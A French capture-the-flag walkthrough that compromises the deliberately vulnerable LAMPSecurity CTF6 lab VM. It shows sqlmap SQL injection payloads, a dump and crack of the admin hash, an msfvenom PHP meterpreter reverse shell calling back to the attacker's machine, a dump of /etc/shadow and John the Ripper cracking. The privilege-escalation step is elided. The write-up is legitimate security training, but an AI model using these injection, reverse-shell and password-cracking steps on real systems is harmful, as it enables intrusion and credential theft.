# LAMPSecurity: CTF6

Lecture recommandée : [Walkthrough sur le challenge LAMPSecurity: CTF5](/CTF-VulnLabs/lampsecurity-CTF5)

[LAMPSecurity](https://sourceforge.net/projects/lampsecurity/) est un projet conçu par
[le chercheur en sécurité madirish2600](https://www.vulnhub.com/author/madirish2600,75/), qui nous gratifie d'un ensemble de machines virtuelles volontairement vulnérables. L'objectif est de trouver et d'exploiter des vulnérabilités sur chacune de ces VM, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. Ce _walkthrough_ sera consacré à la résolution complète de la sixième VM de la série, [LAMPSecurity CTF6](https://www.vulnhub.com/entry/lampsecurity-ctf6,85/). Vous voilà prévenus, attention aux spoilers.

## Recherche d'informations

192.168.56.102 est l'adresse IP de ma machine virtuelle [Kali](https://docs.kali.org/introduction/what-is-kali-linux), tandis que 192.168.56.101 correspond à l'adresse IP de la VM LAMPSecurity CTF6. À présent, c'est au tour de l'outil [nmap](https://nmap.org/book/man.html) d'être lancé afin de détecter les ports ouverts sur le serveur CTF6, d'identifier les services installés et d'obtenir des informations sur le système d'exploitation.

```console
root@blinils:~# nmap -sT -sV -p- 192.168.56.101

Nmap scan report for 192.168.56.101
Host is up (0.019s latency).
Not shown: 65525 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 4.3 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.2.3 ((CentOS))
110/tcp  open  pop3     Dovecot pop3d
111/tcp  open  rpcbind  2 (RPC #100000)
143/tcp  open  imap     Dovecot imapd
443/tcp  open  ssl/http Apache httpd 2.2.3 ((CentOS))
719/tcp  open  status   1 (RPC #100024)
993/tcp  open  ssl/imap Dovecot imapd
995/tcp  open  ssl/pop3 Dovecot pop3d
3306/tcp open  mysql    MySQL 5.0.45
MAC Address: 08:00:08:00:08:00 (Oracle VirtualBox virtual NIC)
```

Il est possible de [se connecter à distance avec SSH](https://en.wikipedia.org/wiki/Secure_Shell) au serveur LAMPSecurity CTF6 (port 22), un serveur Web Apache 2.2.3 (ports 80/443), une base de données MySQL (port 3306) et un serveur de messagerie électronique (ports 110/143/993/995) y sont installés. Pour chacun de ces services, il est désormais temps de partir à la chasse aux vulnérabilités.

## Exploitation d'une injection SQL sur le paramètre id

```console
root@blinils:~# sqlmap -u "http://192.168.56.101/index.php?id=14"
--snip--
[00:11:22] [INFO] testing connection to the target URL
[00:11:22] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[00:11:22] [INFO] testing if the target URL content is stable
[00:11:22] [INFO] target URL content is stable
[00:11:22] [INFO] testing if GET parameter 'id' is dynamic
[00:11:22] [WARNING] GET parameter 'id' does not appear to be dynamic
[00:11:22] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[00:11:22] [INFO] testing for SQL injection on GET parameter 'id'
--snip--
[00:11:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[00:11:22] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
--snip--
[00:11:22] [INFO] target URL appears to be UNION injectable with 7 columns
[00:11:22] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
--snip--
Parameter: id (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=14 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: id=14 UNION ALL SELECT NULL,NULL,CONCAT(0x71,0x68,0x71),NULL,NULL,NULL,NULL-- ScYF
---
[00:11:22] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 5.10
web application technology: PHP 5.2.6, Apache 2.2.3
back-end DBMS: MySQL >= 5.0.12
[00:11:22] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.56.101'
```

En quelques secondes à peine, SQLMap a détecté qu'il s'agit d'une base de données MySQL et que le paramètre testé _id_ est vulnérable aux injections SQL. Après plusieurs tentatives, SQLMap récupère les tables (--tables) ainsi que les colonnes (--columns) présentes dans chaque base de données trouvée (--dbs), et tant qu'à faire, autant récupérer tout le contenu de la base de données (--dump-all).

```console
root@blinils:~# sqlmap -u "http://192.168.56.101/index.php?id=14" --dbms=MySQL --dbs -v0
--snip--
available databases [5]:
[*] cms
[*] information_schema
[*] mysql
[*] roundcube
[*] test
```

C'est parti pour le dump des données !

```console
root@blinils:~# sqlmap -u "http://192.168.56.101/index.php?id=14" --dbms=MySQL -D cms --tables
--snip--
[00:11:22] [INFO] fetching tables for database: 'cms'
Database: cms
[3 tables]
+-------+
| user  |
| event |
| log   |
+-------+

--snip--

root@blinils:~# sqlmap -u "http://192.168.56.101/index.php?id=14" --dbms=MySQL --dump -D cms -T user
--snip--
[00:11:22] [INFO] fetching columns for table 'user' in database 'cms'
[00:11:22] [INFO] fetching entries for table 'user' in database 'cms'
[00:11:22] [INFO] recognized possible password hashes in column 'user_password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[00:11:22] [INFO] writing hashes to a temporary file '/tmp/sqlmapbMP1dW10777/sqlmaphashes-vbDWaU.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[00:11:22] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/txt/wordlist.zip' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[00:11:22] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[00:11:22] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[00:11:22] [INFO] starting 2 processes 
[00:11:22] [INFO] cracked password 'adminpass' for hash '25e4ee4e9229397b6b17776bfceaf8e7'                                                 
Database: cms                                                                                                                              
Table: user
[1 entry]
+---------+---------------+----------------------------------------------+
| user_id | user_username | user_password                                |
+---------+---------------+----------------------------------------------+
| 1       | admin         | 25e4ee4e9229397b6b17776bfceaf8e7 (adminpass) |
+---------+---------------+----------------------------------------------+
```

[L'attaque par dictionnaire sur le hash de mot de passe](https://repo.zenk-security.com/Reversing%20.%20cracking/Cracking_Passwords_Guide.pdf) a porté ses fruits : on a récupéré le mot de passe de l'admin !

## Formulaire d'upload et reverse shell

L'administrateur a la possibilité de créer des articles sur le site, et d'y adjoindre une image via un formulaire d'upload. Or cette fonctionnalité n'est pas filtrée, car après plusieurs tests, on constate qu'aucune vérification n'est en place, sur l'extension ou le type du fichier. Il est ainsi possible de transférer [un script malveillant](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) afin d'interagir avec le serveur, d'y exécuter des commandes arbitraires et d'en prendre le contrôle.

Le principe est le suivant : un [_reverse shell_](https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/) en PHP va être créé et déposé sur le serveur. Ce bout de code va, dans un premier temps, créer une connexion sur le port 12345 entre le serveur CTF6 (192.168.56.101) et notre propre machine (192.168.56.102), avant d'envoyer un [meterpreter](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/) à travers la connexion créée, qui sera exécuté sur le serveur distant.

```console
root@blinils:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=12345 -o shell.php
No platform was selected, choosing Msf::Module::Platform::PHP from the payload
No Arch selected, selecting Arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1116 bytes
Saved as: shell.php
```

Un listener est alors mis en place sur notre machine, afin d'écouter toute connexion entrante sur le port 12345.

```console
root@blinils:~# service postgresql start
root@blinils:~# msfdb start
root@blinils:~# msfconsole
                                                  
--snip--
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.56.102
LHOST => 192.168.56.102
msf exploit(multi/handler) > set LPORT 12345
LPORT => 12345

msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 1.

[*] Started reverse TCP handler on 192.168.56.102:12345
```

Le fait d'appeler le fichier situé dans le répertoire /uploads amorce la connexion.

```console
msf exploit(multi/handler) > [*] Sending stage (37775 bytes) to 192.168.56.101
[*] Meterpreter session 1 opened (192.168.56.102:12345 -> 192.168.56.101:50145) at 2018-01-01 01:01:01 +0200

msf exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                   Information                          Connection
  --  ----  ----                   -----------                          ----------
  1         meterpreter php/linux  apache (48) @ localhost.localdomain  192.168.56.102:12345 -> 192.168.56.101:50145 (192.168.56.101)
```

Il ne nous reste plus qu'à créer un [pseudo-terminal Bash](https://netsec.ws/?p=337) avec le module PTY.

```console
msf exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer    : localhost.localdomain
OS          : Linux localhost.localdomain 2.6.18-92.el5 #1 SMP Tue Jun 10 18:49:47 EDT 2008 i686
Meterpreter : php/linux

meterpreter > shell
Process 4940 created.
Channel 1 created.

id
uid=48(apache) gid=48(apache) groups=48(apache)

python -c 'import pty; pty.spawn("/bin/bash")'
bash-3.2$ 
```

### Élévation de privilèges (root)

...

### Attaque par dictionnaire avec John The Ripper sur le fichier /etc/shadow

Le fichier /etc/shadow est particulièrement intéressant, car
[il contient les mots de passe hashés de chaque compte Unix](https://fr.wikipedia.org/wiki/Passwd), ainsi que la date de la dernière modification du mot de passe ou encore la date d'expiration des comptes.
L'outil John The Ripper est en mesure de [cracker les mots de passe Unix](https://korben.info/comment-cracker-un-mot-de-passe-sous-linux.html) si on lui fournit les fichiers /etc/passwd et /etc/shadow, comme suit...

```console
sh-3.2# cat /etc/shadow
cat /etc/shadow
root:$1$Ak2GEFmW$6iOwo7maaMRENjSG/mG.J.:14423:0:99999:7:::
bin:*:14397:0:99999:7:::
daemon:*:14397:0:99999:7:::
adm:*:14397:0:99999:7:::
lp:*:14397:0:99999:7:::
sync:*:14397:0:99999:7:::
shutdown:*:14397:0:99999:7:::
halt:*:14397:0:99999:7:::
mail:*:14397:0:99999:7:::
news:*:14397:0:99999:7:::
uucp:*:14397:0:99999:7:::
operator:*:14397:0:99999:7:::
games:*:14397:0:99999:7:::
gopher:*:14397:0:99999:7:::
ftp:*:14397:0:99999:7:::
nobody:*:14397:0:99999:7:::
rpm:!!:14397:0:99999:7:::
dbus:!!:14397:0:99999:7:::
avahi:!!:14397:0:99999:7:::
mailnull:!!:14397:0:99999:7:::
smmsp:!!:14397:0:99999:7:::
distcache:!!:14397:0:99999:7:::
apache:!!:14424:0:99999:7:::
nscd:!!:14397:0:99999:7:::
vcsa:!!:14397:0:99999:7:::
rpc:!!:14397:0:99999:7:::
rpcuser:!!:14397:0:99999:7:::
nfsnobody:!!:14397:0:99999:7:::
sshd:!!:14397:0:99999:7:::
squid:!!:14397:0:99999:7:::
mysql:!!:14397:0:99999:7:::
pcap:!!:14397:0:99999:7:::
haldaemon:!!:14397:0:99999:7:::
dovecot:!!:14418::::::
john:$1$mWFcMD52$Cnk.XsZ.vxpNIjMcRn8AP0:14419:0:99999:7:::
linda:$1$KDqdFFfU$wNrRtbShFLx5R7I/YWLMR1:14419:0:99999:7:::
fred:$1$jgdM97Rl$.nRcphYfCDGkWe0X7p7p/0:14419:0:99999:7:::
molly:$1$90uKe4zN$Y5pqf0NGx2aVLBxBTXZHh0:14419:0:99999:7:::
toby:$1$2vgQS3Bq$p4Aq.m1RYM3iWopT6Izg51:14419:0:99999:7:::
```

Notre dictionnaire préféré est appelé à la rescousse : Rockyou.

```console
root@blinils:~# unshadow passwdCTF6.txt shadowCTF6.txt > passwd.db
root@blinils:~# john passwd.db --wordlist=/usr/share/dict/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "aix-smd5"
Use the "--format=aix-smd5" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (md5crypt, crypt(3) $1$ [MD5 128/128 AVX 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
beckham          (molly)
fred1982         (fred)
squirrel3        (linda)
--snip--
Session completed

root@blinils:~# john db --show
linda:squirrel3:501:501::/home/linda:/bin/bash
fred:fred1982:502:502::/home/fred:/bin/bash
molly:beckham:503:503::/home/molly:/bin/bash

3 password hashes cracked, 3 left
```
